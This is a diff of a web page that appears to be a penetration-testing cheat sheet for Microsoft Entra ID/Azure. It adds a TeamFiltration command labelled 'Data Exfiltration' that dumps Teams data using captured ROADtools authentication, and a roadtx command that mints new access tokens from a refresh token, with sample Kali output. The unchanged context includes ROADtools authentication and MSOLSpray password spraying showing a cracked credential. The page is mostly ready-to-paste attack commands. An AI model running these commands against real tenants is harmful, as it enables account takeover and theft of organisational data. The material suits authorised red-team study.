@@ -160,7 +160,7 @@
   </ul>
 </div>
   <div id="dynamicFormContainer">
-	<form id="dynamicForm" style="display: none;"><div class="input-group"><label for="PASSWORD">PASSWORD: </label><input type="text" name="PASSWORD"></div><div class="input-group"><label for="USER">USER: </label><input type="text" name="USER"></div><div class="input-group"><label for="USERS_FILE">USERS FILE: </label><input type="text" name="USERS_FILE"></div><div class="input-group"><label for="autoReplace">Auto Replace: </label><input type="checkbox" id="autoReplace" name="autoReplace"></div></form>
+	<form id="dynamicForm" style="display: none;"><div class="input-group"><label for="CLIENT_ID">CLIENT ID: </label><input type="text" name="CLIENT_ID"></div><div class="input-group"><label for="OUTPUT_PATH">OUTPUT PATH: </label><input type="text" name="OUTPUT_PATH"></div><div class="input-group"><label for="PASSWORD">PASSWORD: </label><input type="text" name="PASSWORD"></div><div class="input-group"><label for="SECRET">SECRET: </label><input type="text" name="SECRET"></div><div class="input-group"><label for="USER">USER: </label><input type="text" name="USER"></div><div class="input-group"><label for="USERS_FILE">USERS FILE: </label><input type="text" name="USERS_FILE"></div><div class="input-group"><label for="autoReplace">Auto Replace: </label><input type="checkbox" id="autoReplace" name="autoReplace"></div></form>
 	<div class="buttons center">
 		<button id="form_btn">Show Inspector</button>
 		<button id="replace_btn" style="display: none;">Replace Params</button>
@@ -171,6 +171,8 @@
   <h3 id="recon">Recon</h3>
 <p class="tabs">
 <button data-tabset="set1" data-tabcontent="tab1" class="active">ROADTools</button>
+
+<button data-tabset="set1" data-tabcontent="tab2">TeamFiltration</button>
 
 </p><div class="tabset-wrapper" data-tabset-group="set1"><div class="tabcontent active" data-tabset="set1" data-tabcontent="tab1"><h4 id="1-authenticate">1. Authenticate</h4>
 <div class="highlight"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">roadrecon auth -u '<span class="o editable-keyword">&lt;USER&gt;</span>' -p '<span class="o editable-keyword">&lt;PASSWORD&gt;</span>'
@@ -196,7 +198,12 @@
 </span></span></span><span class="line"><span class="cl"><span class="go">WARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.
 </span></span></span><span class="line"><span class="cl"><span class="go"> * Running on http://127.0.0.1:5000
 </span></span></span><span class="line"><span class="cl"><span class="go">Press CTRL+C to quit
-</span></span></span></div></pre></div></div></div><p></p>
+</span></span></span></div></pre></div><p><small><em>Ref: <a href="https://github.com/dirkjanm/ROADtools">ROADTools</a></em></small></p></div><div class="tabcontent" data-tabset="set1" data-tabcontent="tab2"><h4 id="1-data-exfiltration">1. Data Exfiltration</h4>
+<div class="highlight"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">./TeamFiltration --roadtools .roadtools_auth --exfil --teams --outpath <span class="o editable-keyword">&lt;OUTPUT_PATH&gt;</span>
+</span></span></span></code><div class="output-bubble">Sample Output:
+TO-DO</div></pre></div><p><small><em>Ref: <a href="https://github.com/Flangvik/TeamFiltration">TeamFiltration</a></em></small></p></div></div>
+
+<p></p>
 <hr>
 <h3 id="password-spraying">Password Spraying</h3>
 <blockquote>
@@ -218,6 +225,18 @@ TO-DO</div></pre></div><h4 id="2-run">2. Run</h4>
 </span></span></span><span class="line"><span class="cl"><span class="go">[*] Current date and time: 02/20/2025 14:48:11                                                                                                                                                                      
 </span></span></span><span class="line"><span class="cl"><span class="go">[*] SUCCESS! apple.seed@example.com : Test1234
 </span></span></span></div></pre></div><p><small><em>Ref: <a href="https://github.com/dafthack/MSOLSpray">MSOLSpray</a></em></small></p></div></div><p></p>
+<hr>
+<h3 id="generate-token-with-refresh-token">Generate Token with Refresh Token</h3>
+<p class="tabs">
+<button data-tabset="set3" data-tabcontent="tab1" class="active">ROADTools</button>
+
+</p><div class="tabset-wrapper" data-tabset-group="set3"><div class="tabcontent active" data-tabset="set3" data-tabcontent="tab1"><div class="highlight"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">roadtx gettokens --refresh-token '<span class="o editable-keyword">&lt;SECRET&gt;</span>' -c '<span class="o editable-keyword">&lt;CLIENT_ID&gt;</span>'
+</span></span></span></code><div class="output-bubble">Sample Output:
+<span class="line"><span class="cl"><span class="go">┌──(venv)─(kali㉿kali)-[~]
+</span></span></span><span class="line"><span class="cl"><span class="go">└─$ roadtx gettokens --refresh-token '1.Aa8AA...[SNIP]...zt4WQ' -c '04b07...[SNIP]...f7b46'
+</span></span></span><span class="line"><span class="cl"><span class="go">Requesting token for resource https://graph.windows.net
+</span></span></span><span class="line"><span class="cl"><span class="go">Tokens were written to .roadtools_auth
+</span></span></span></div></pre></div><p><small><em>Ref: <a href="https://github.com/dirkjanm/ROADtools">ROADTools</a></em></small></p></div></div><p></p>
 
 </div>
 </main>
